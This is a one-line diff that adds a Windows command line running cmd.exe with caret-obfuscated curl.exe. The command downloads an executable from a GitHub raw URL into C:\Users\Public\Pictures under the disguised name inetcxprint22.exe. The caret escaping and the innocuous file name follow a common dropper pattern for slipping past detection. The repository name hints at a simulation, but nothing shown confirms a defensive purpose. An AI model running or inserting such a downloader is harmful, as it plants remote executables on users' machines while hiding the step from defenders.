@@ -1,0 +1,1 @@
+C:\Windows\System32\cmd.exe /c "c^u^rl.e^x^e -L https://github.com/ededx/simulator/raw/main/test_projet_c++.exe --output C:\Users\Public\Pictures\inetcxprint22.exe"
